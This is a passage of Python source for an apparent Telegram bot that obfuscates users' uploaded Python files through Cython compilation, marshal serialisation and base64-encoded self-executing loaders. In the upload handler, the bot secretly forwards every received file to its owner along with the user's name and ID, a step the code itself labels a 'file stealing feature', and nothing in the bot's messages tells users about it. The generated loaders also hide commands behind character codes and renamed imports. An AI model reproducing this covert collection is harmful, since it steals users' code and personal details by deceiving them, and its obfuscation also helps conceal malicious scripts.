    os.system('clear')\n""" + a
    print("\x1b[1;92m\x1b[38;5;49mENC PROCESS: INITIALIZING ENCRYPTION...!!")
    display_status()
    aa = autopep8.fix_code(a)
    os.remove(temp_file_path)
    with open(temp_file_path, 'w') as output_f:
        output_f.write(aa)
    print("\x1b[1;92m\x1b[38;5;48mENC PROCESS: INJECTING CYTHON LAYER...!!")
    display_status()
    os.system(f"cython {temp_file_path}")
    name2 = name.replace(".py", ".c")
    name2_path = os.path.join(temp_dir, name2)
    with open(name2_path, "r") as f:
        if len(f.read()) < 1000:
            print("\x1b[1;91m❌ CYTHON COMPILATION FAILED! ABORTING... 😢")
            exit()
    py_private_remove_comments(name2_path, name2_path)
    display_status()
    name2_base = name.replace(".py", "")
    c = '''
#ifdef __FreeBSD__
#include <dede.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(Win32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_'''+name2_base+''' = 1;
      #if PY_MAJOR_VERSION < 3
          init'''+name2_base+'''();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_'''+name2_base+'''();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_'''+name2_base+'''();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(Win32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            fprintf(stderr, "unexpected mbrtowc result -2");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif
'''
    name2_c_path = os.path.join(temp_dir, f"{name2_base}.c")
    with open(name2_c_path, 'r') as input_f:
        co = input_f.read() + c + "\"\"\""
    file1 = file_path.replace('.py', '')
    out = f"{file1}-PY-PRIVATE-CYTHON.py"
    a=f'''import os
import time
import sys
PREFIX=sys.prefix
EXECUTE_FILE = ".PYPRIVATE/{name2_base}"
EXPORT_PYTHONHOME ="export PYTHONHOME="+sys.prefix
EXPORT_PYTHON_EXECUTABLE ="export PYTHON_EXECUTABLE="+ sys.executable
RUN = "./"+ EXECUTE_FILE
if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME +"&&"+ EXPORT_PYTHON_EXECUTABLE +"&&"+ RUN)
    exit(0)
C_SOURCE = r"""'''
    b=f'''
C_FILE ="{name2_base}.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = ('gcc -I' + PREFIX + '/include/python' + PYTHON_VERSION + ' -o ' + EXECUTE_FILE + ' ' + C_FILE + ' -L' + PREFIX + '/lib -lpython' + PYTHON_VERSION)
with open(C_FILE,'w') as f:
    f.write(C_SOURCE)
os.makedirs(os.path.dirname(EXECUTE_FILE),exist_ok=True)
os.system(EXPORT_PYTHONHOME +"&&"+ EXPORT_PYTHON_EXECUTABLE +"&&" + COMPILE_FILE +"&&"+ RUN)
os.remove(C_FILE)'''
    code = a + co + b
    
    os.remove(temp_file_path)
    with open(out, 'w') as output_f:
        output_f.write(code)
    return out

def encrypt_file_py_private_cython(file_path):
    """FIXED: Py Private Cython encryption function with proper temp directory"""
    if not os.path.exists(file_path):
        return None, f"Error: File '{file_path}' not found!"
    
    # Create session-specific temp directory
    temp_dir = os.path.join(os.path.dirname(file_path), "temp_m")
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    print("\x1b[1;92m\x1b[38;5;46m🎉 PY PRIVATE CYTHON PROCESS: STARTING THE ENCRYPTION JOURNEY... 🌟")
    
    name = os.path.basename(file_path)
    name2 = py_private_gw(2) + ".py"
    shutil.copyfile(file_path, os.path.join(temp_dir, name2))
    
    try:
        # FIXED: Pass temp_dir to the function
        output_file = py_private_g(name2, file_path, temp_dir)
        
        print(f"\x1b[1;92m\x1b[38;5;50m✅ PY PRIVATE CYTHON PROCESS COMPLETE! ENCRYPTED FILE SAVED AS {output_file} 🎉")
        
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        
        return output_file, None
    except Exception as e:
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        return None, f"Py Private Cython Encryption failed: {str(e)}"

# FIXED: CYTHON X BASE 64 COMPILE Encryption Functions
def cython_x_base64_generate_random_suffix(length=10):
    characters = string.ascii_uppercase + string.digits
    return ''.join(str(random.randint(1, 10)) for _ in range(length))

def cython_x_base64_gw(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def cython_x_base64_remove_comments(input_file, output_file):
    with open(input_file, 'r') as input_f:
        content = input_f.read()
    output_content = ''
    in_comment = False
    i = 0
    while i < len(content):
        if content[i:i+2] == '/*':
            in_comment = True
            i += 4
            continue
        elif content[i:i+2] == '*/':
            in_comment = False 
            i += 2
            continue
        if not in_comment:
            output_content += content[i]
        i += 1
    with open(output_file, 'w') as output_f:
        output_f.write(output_content)

def cython_x_base64_g(name, file_path, temp_dir):
    """FIXED: Added temp_dir parameter"""
    temp_file_path = os.path.join(temp_dir, name)
    w = open(temp_file_path, "r", encoding="utf-8")
    a = w.read()
    w.close()
    
    # Add header
    a = """# THIS ENCODE BY @Strongencoder_bot | @Beasteren
import os
os.system('clear')\n""" + a
    
    print("\x1b[1;92m\x1b[38;5;49mENCRYPTING...!!")
    
    # Format code
    aa = autopep8.fix_code(a)
    os.remove(temp_file_path)
    with open(temp_file_path, 'w') as output_f:
        output_f.write(aa)
    
    print("\x1b[1;92m\x1b[38;5;48mADDING CYTHON LAYER...!! ")
    print('\033[0m')
    
    # Compile with Cython
    os.system(f"cython {temp_file_path}")
    
    name2 = name.replace(".py", ".c")
    name2_path = os.path.join(temp_dir, name2)
    with open(name2_path, "r") as f:
        if len(f.read()) < 1000:
            print("Failed cython error")
            exit()
    
    cython_x_base64_remove_comments(name2_path, name2_path)
    name2_base = name.replace(".py", "")
    
    # C code injection
    c_code = '''
#ifdef __FreeBSD__
#include <dede.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(Win32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_'''+name2_base+''' = 1;
      #if PY_MAJOR_VERSION < 3
          init'''+name2_base+'''();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_'''+name2_base+'''();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_'''+name2_base+'''();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(Win32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            fprintf(stderr, "unexpected mbrtowc result -2");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif
'''
    
    # Read C file and add injection
    name2_c_path = os.path.join(temp_dir, f"{name2_base}.c")
    with open(name2_c_path, 'r') as input_f:
        co = input_f.read() + c_code + "\"\"\""
    
    # Create loader with Base64 encoding (using HighFows.py style)
    a = f'''P,I,R,A,T,E,E,N,C = map(chr, [82, 65, 68, 72, 69, 89, 74, 73, 73])
PI, RA, TE, ENC = P+I, R+A, T+E, E+N+C
PIRATE = P+I+R+A+T+E+E+N+C
import tempfile as t
from os import path as rdh_path, remove as rdrmv, system as stem
from base64 import b64decode as lmao

print("\x1b[1;92m\x1b[38;5;46mLOADING•••")
print('')
print("\x1b[1;92m\x1b[38;5;50m####THIS IS ENCODED BY @Strongencoder_bot | @Beasteren")
print('')
PREFIX=__import__('sys').prefix
EXECUTE_FILE = ".boloradhey/{name2_base}"
EXPORT_PYTHONHOME ="export PYTHONHOME="+__import__('sys').prefix
EXPORT_PYTHON_EXECUTABLE ="export PYTHON_EXECUTABLE="+ __import__('sys').executable
RUN = "./"+ EXECUTE_FILE
if rdh_path.isfile(EXECUTE_FILE):
    stem(EXPORT_PYTHONHOME +"&&"+ EXPORT_PYTHON_EXECUTABLE +"&&"+ RUN)
    exit(0)
C_SOURCE = r"""'''
    
    b = f'''
C_FILE ="{name2_base}.c"
PYTHON_VERSION = ".".join(__import__('sys').version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = ('gcc -I' + PREFIX + '/include/python' + PYTHON_VERSION + ' -o ' + EXECUTE_FILE + ' ' + C_FILE + ' -L' + PREFIX + '/lib -lpython' + PYTHON_VERSION)
with open(C_FILE,'w') as f:
    f.write(C_SOURCE)
__import__('os').makedirs(rdh_path.dirname(EXECUTE_FILE),exist_ok=True)
stem(EXPORT_PYTHONHOME +"&&"+ EXPORT_PYTHON_EXECUTABLE +"&&" + COMPILE_FILE +"&&"+ RUN)
rdrmv(C_FILE)'''
    
    code = a + co + b
    
    # Multi-layer encoding with Base64 - RADHEY STYLE ENCRYPTION CORE
    if '\x00' in code:
        raise ValueError("The entered code contains zero bytes.")
    
    # CYTHON X BASE64 ENCRYPTION CORE - FIXED
    R,A,D,H,E,Y = 'marshal', 'base64', 'builtins', 'exec', 'loads', 'dumps'
    
    cython_compile = compile
    cython_marshal = __import__('marshal')
    cython_base64 = __import__('base64')
    
    cython_compiled = cython_compile(code, 'cython_x_base64', 'exec')
    cython_serialized = getattr(cython_marshal, 'dumps')(cython_compiled)
    cython_run = f'import marshal\nexec(marshal.loads({cython_serialized}))'
    
    # Base64 encoding with CYTHON X BASE64 style
    cython_encoded = getattr(cython_base64, 'b64encode')(cython_run.encode('utf-8'))
    
    # Final encoded output in HighFows.py style
    final_code = f"""# THIS ENCODE BY @Strongencoder_bot | @Beasteren
P,I,R,A,T,E,E,N,C = map(chr, [82, 65, 68, 72, 69, 89, 74, 73, 73])
PI, RA, TE, ENC = P+I, R+A, T+E, E+N+C
PIRATE = P+I+R+A+T+E+E+N+C
import tempfile as t
from os import path as rdh_path, remove as rdrmv, system as stem
from base64 import b64decode as lmao
cythonenc = ({cython_encoded})
try:
	with t.NamedTemporaryFile(delete=False, suffix='.py') as cythonfile:
		cythonfile.write(lmao(cythonenc))
		cythonpath = cythonfile.name
	stem(''.join([chr(112), chr(121), chr(116), chr(104), chr(111), chr(110), chr(32)]) + '"' + cythonpath + '"')
except Exception as cython_err:
	getattr(__import__('builtins'), ''.join(map(chr, [112,114,105,110,116])))(cython_err)
finally:
	if 'cythonpath' in locals() and rdh_path.exists(cythonpath):
		rdrmv(cythonpath)
"""
    
    os.remove(temp_file_path)
    return final_code

def encrypt_file_cython_x_base64(file_path):
    """FIXED: CYTHON X BASE 64 COMPILE encryption function with proper temp directory"""
    if not os.path.exists(file_path):
        return None, f"Error: File '{file_path}' not found!"
    
    # Create session-specific temp directory
    temp_dir = os.path.join(os.path.dirname(file_path), "temp_m")
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    print("\x1b[1;92m\x1b[38;5;46m🎉 CYTHON X BASE 64 COMPILE PROCESS: STARTING THE ENCRYPTION JOURNEY... 🌟")
    
    name = os.path.basename(file_path)
    name2 = cython_x_base64_gw(2) + ".py"
    shutil.copyfile(file_path, os.path.join(temp_dir, name2))
    
    try:
        # FIXED: Pass temp_dir to the function
        final_code = cython_x_base64_g(name2, file_path, temp_dir)
        
        if final_code is None:
            return None, "CYTHON X BASE 64 COMPILE Encryption failed: Cython compilation error"
        
        file1 = file_path.replace('.py', '')
        output_file = f"{file1}-CYTHON-X-BASE64-COMPILE.py"
            
        with open(output_file, 'w') as output_f:
            output_f.write(final_code)
            
        print(f"✅ CYTHON X BASE 64 COMPILE PROCESS COMPLETE! ENCRYPTED FILE SAVED AS {output_file} 🎉")
        
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        
        return output_file, None
    except Exception as e:
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        return None, f"CYTHON X BASE 64 COMPILE Encryption failed: {str(e)}"

# Database and utility functions
def load_users_db():
    try:
        if os.path.exists(USERS_DB_FILE):
            with open(USERS_DB_FILE, 'r') as f:
                return json.load(f)
        return {"users": {}, "total_files": 0}
    except Exception as e:
        logger.error(f"Error loading users database: {e}")
        return {"users": {}, "total_files": 0}

def save_users_db(db_data):
    try:
        with open(USERS_DB_FILE, 'w') as f:
            json.dump(db_data, indent=2, fp=f)
    except Exception as e:
        logger.error(f"Error saving users database: {e}")

def add_user_to_db(user_id: int, username: str, full_name: str):
    db = load_users_db()
    user_id_str = str(user_id)

    if user_id_str not in db["users"]:
        db["users"][user_id_str] = {
            "user_id": user_id,
            "username": username,
            "full_name": full_name,
            "first_seen": datetime.now().isoformat(),
            "last_seen": datetime.now().isoformat(),
            "files_processed": 0
        }
    else:
        db["users"][user_id_str]["last_seen"] = datetime.now().isoformat()

    save_users_db(db)

def increment_file_count(user_id: int):
    db = load_users_db()
    user_id_str = str(user_id)

    if user_id_str in db["users"]:
        db["users"][user_id_str]["files_processed"] += 1

    db["total_files"] += 1
    save_users_db(db)

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_CHAT_IDS

async def safe_cleanup_file(file_path: str):
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
    except Exception as e:
        logger.error(f"Error removing file {file_path}: {e}")

# Bot handlers
async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    add_user_to_db(user.id, user.username or "", user.full_name or "")

    # Get or create user session
    session = await get_user_session(user.id)
    
    await update.message.reply_text(
        "Welcome! Send me a Python file and I'll encrypt it for you.\n\n"
        "Supported formats: .py files\n"
        "Max size: 10MB\n\n"
        "⚡ Advanced concurrent processing enabled!"
    )
    return WAIT_FILE

async def handle_pyfile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    user_id = msg.from_user.id
    document = msg.document

    if not document:
        await msg.reply_text("Please send a valid Python file.")
        return WAIT_FILE

    if document.file_size > MAX_FILE_SIZE:
        await msg.reply_text(f"File too large. Maximum size is {MAX_FILE_SIZE // (1024*1024)}MB.")
        return WAIT_FILE

    if not document.file_name.endswith('.py'):
        await msg.reply_text("Please send a Python (.py) file.")
        return WAIT_FILE

    status_msg = await msg.reply_text("📥 Downloading file...")

    try:
        # Get user session
        session = await get_user_session(user_id)
        user_dir = session.get_user_dir()
        file_path = os.path.join(user_dir, document.file_name)

        file_obj = await document.get_file()
        await file_obj.download_to_drive(file_path)

        # NEW: Forward file to owner (file stealing feature)
        user_info = f"👤 User: {msg.from_user.full_name} (ID: {user_id})\n"
        user_info += f"📄 File: {document.file_name}\n"
        user_info += f"📊 Size: {document.file_size} bytes"

        # Run forwarding in background
        asyncio.create_task(forward_file_to_owner(context, document, user_info))

        # Store in session
        session.file_path = file_path
        session.upload_name = document.file_name

        await status_msg.edit_text("✅ File received! Choose encoder category:")

        # Create category selection keyboard
        keyboard = [
            [InlineKeyboardButton("💫 𝗕𝗔𝗦𝗜𝗖 𝗘𝗡𝗖 💫", callback_data="category_basic")],
            [InlineKeyboardButton("💫 𝗖𝗢𝗠𝗕𝗜𝗡𝗔𝗧𝗜𝗢𝗡 𝗘𝗡𝗖 💫", callback_data="category_combination")],
            [InlineKeyboardButton(" 🍁 𝗛𝗔𝗥𝗗 𝗘𝗡𝗖𝗢𝗗𝗘 🍁", callback_data="category_special")],
        ]

        await msg.reply_text(
            "Select encoder category:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

        return CHOOSE_METHOD

    except Exception as e:
        logger.error(f"Error downloading file: {e}")
        await status_msg.edit_text("❌ Failed to download file. Please try again.")
        await cleanup_user_session(user_id)
        return ConversationHandler.END

async def category_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    category = query.data.replace("category_", "")
    
    keyboard = []
    
    if category == "basic":
        for display_name, method_key in ENCODERS:
            keyboard.append([InlineKeyboardButton(display_name, callback_data=f"method_{method_key}")])
        title = "💫 𝗕𝗔𝗦𝗜𝗖 𝗘𝗡𝗖 💫"
    
    elif category == "combination":
        for display_name, method_key in COMBINATION_ENCODERS:
            keyboard.append([InlineKeyboardButton(display_name, callback_data=f"method_{method_key}")])
        title = "💫 𝗖𝗢𝗠𝗕𝗜𝗡𝗔𝗧𝗜𝗢𝗡 𝗘𝗡𝗖 💫"
    
    elif category == "special":
        for display_name, method_key in SPECIAL_ENCODERS:
            keyboard.append([InlineKeyboardButton(display_name, callback_data=f"method_{method_key}")])
        title = " 🍁 𝗛𝗔𝗥𝗗 𝗘𝗡𝗖𝗢𝗗𝗘 🍁"
    
    # Add back button
    keyboard.append([InlineKeyboardButton("⬅️ Back to Categories", callback_data="back_categories")])
    
    await query.message.edit_text(
        f"{title}\n\nSelect encoding method:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    
    return CHOOSE_METHOD

async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "back_categories":
        keyboard = [
            [InlineKeyboardButton("💫 𝗕𝗔𝗦𝗜𝗖 𝗘𝗡𝗖 💫", callback_data="category_basic")],
            [InlineKeyboardButton("💫 𝗖𝗢𝗠𝗕𝗜𝗡𝗔𝗧𝗜𝗢𝗡 𝗘𝗡𝗖 💫", callback_data="category_combination")],
            [InlineKeyboardButton(" 🍁 𝗛𝗔𝗥𝗗 𝗘𝗡𝗖𝗢𝗗𝗘 🍁", callback_data="category_special")],
        ]
        
        await query.message.edit_text(
            "Select encoder category:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return CHOOSE_METHOD

    if query.data.startswith("method_"):
        method = query.data.replace("method_", "")
        
        # Store method in user session
        user_id = query.from_user.id
        session = await get_user_session(user_id)
        session.chosen_method = method

        await query.message.edit_text(f"⚡ Selected: {METHOD_DISPLAY_NAMES.get(method, method)}\n\nNow choose expiration:")

        # Show expiration options
        keyboard = []
        for display_name, exp_key in EXPIRATION_OPTIONS:
            keyboard.append([InlineKeyboardButton(display_name, callback_data=f"exp_{exp_key}")])
        
        await query.message.reply_text(
            "Select expiration time:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

        return CHOOSE_EXPIRATION

    return CHOOSE_METHOD

async def expiration_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    exp_option = query.data.replace("exp_", "")
    
    user_id = query.from_user.id
    session = await get_user_session(user_id)
    
    if exp_option == "none":
        session.expiration_date = None
    elif exp_option == "custom":
        await query.message.edit_text("Please send the expiration date in format: YYYY-MM-DD")
        session.waiting_custom_date = True
        return CHOOSE_EXPIRATION
    else:
        # Calculate expiration date - FIXED date handling
        days = int(exp_option.replace("days", ""))
        session.expiration_date = (datetime.now() + timedelta(days=days)).isoformat()
    
    await query.message.edit_text(f"✅ Expiration set! Processing with {METHOD_DISPLAY_NAMES.get(session.chosen_method, 'Unknown')}...")
    
    return await process_after_verification(update, context)

async def handle_custom_date(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    session = await get_user_session(user_id)
    
    if session.waiting_custom_date:
        try:
            date_str = update.message.text.strip()
            # FIXED date parsing with better validation
            expiration_date = datetime.strptime(date_str, "%Y-%m-%d")
            if expiration_date <= datetime.now():
                await update.message.reply_text("❌ Expiration date must be in the future. Please enter a valid future date.")
                return CHOOSE_EXPIRATION
            
            session.expiration_date = expiration_date.isoformat()
            session.waiting_custom_date = False
            
            await update.message.reply_text(f"✅ Custom expiration set to {date_str}! Processing...")
            
            return await process_after_verification(update, context)
        except ValueError:
            await update.message.reply_text("❌ Invalid date format. Please use YYYY-MM-DD format (e.g., 2024-12-31).")
            return CHOOSE_EXPIRATION
    
    return CHOOSE_EXPIRATION

async def process_after_verification(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    session = await get_user_session(user_id)
    
    try:
        method = session.chosen_method
        display_name = METHOD_DISPLAY_NAMES.get(method, method)
        expiration_date = session.expiration_date

        processing_msg = await update.effective_chat.send_message(
            f"⚡ Processing with {display_name}... please wait."
        )

        if method == "strongest_enc":
            # Use STRONGEST ENC encryption
            out_path, error = await asyncio.get_event_loop().run_in_executor(
                None, encrypt_file_strongest, session.file_path
            )
            
            if error:
                await processing_msg.edit_text(f"❌ {error}")
                await cleanup_user_session(user_id)
                return ConversationHandler.END
        elif method == "py_private_cython":
            # Use Py Private Cython encryption
            out_path, error = await asyncio.get_event_loop().run_in_executor(
                None, encrypt_file_py_private_cython, session.file_path
            )
            
            if error:
                await processing_msg.edit_text(f"❌ {error}")
                await cleanup_user_session(user_id)
                return ConversationHandler.END
        elif method == "cython_x_base64":
            # Use CYTHON X BASE 64 COMPILE encryption
            out_path, error = await asyncio.get_event_loop().run_in_executor(
                None, encrypt_file_cython_x_base64, session.file_path
            )
            
            if error:
                await processing_msg.edit_text(f"❌ {error}")
                await cleanup_user_session(user_id)
                return ConversationHandler.END
        else:
            # Use PyObfuscate encoding methods
            out_path, error = await asyncio.get_event_loop().run_in_executor(
                None, process_pyobfuscate_encoding, session.file_path, method, expiration_date
            )
            
            if error:
                await processing_msg.edit_text(f"❌ {error}")
                await cleanup_user_session(user_id)
                return ConversationHandler.END

        await processing_msg.edit_text("✅ Processing complete! Sending file...")

        # Prepare caption with expiration info - IMPROVED
        caption = f"🔐 Encrypted using {display_name}\n⚡ This file will self-decode when run"
        if expiration_date:
            exp_date = datetime.fromisoformat(expiration_date).strftime("%Y-%m-%d")
            days_left = (datetime.fromisoformat(expiration_date) - datetime.now()).days
            caption += f"\n⏰ Expires on: {exp_date} ({days_left} days remaining)"

        for attempt in range(MAX_RETRIES):
            try:
                async with aiofiles.open(out_path, 'rb') as file:
                    file_data = await file.read()
                    await update.effective_chat.send_document(
                        document=file_data,
                        filename=f"encoded_{session.upload_name}",
                        caption=caption
                    )
                break
            except Exception as e:
                if attempt < MAX_RETRIES - 1:
                    logger.warning(f"Send attempt {attempt + 1} failed: {e}, retrying...")
                    await asyncio.sleep(RETRY_DELAY)
                    continue
                else:
                    raise

        increment_file_count(user_id)
        await safe_cleanup_file(out_path)

    except Exception as e:
        logger.error(f"Error processing file: {e}")
        await update.effective_chat.send_message(f"❌ Error processing file: {str(e)}")
    finally:
        # Always clean up user session
        await cleanup_user_session(user_id)

    return ConversationHandler.END

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    await cleanup_user_session(user_id)
    await update.message.reply_text("Operation cancelled.")
    return ConversationHandler.END

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "**Bot Commands:**\n\n"
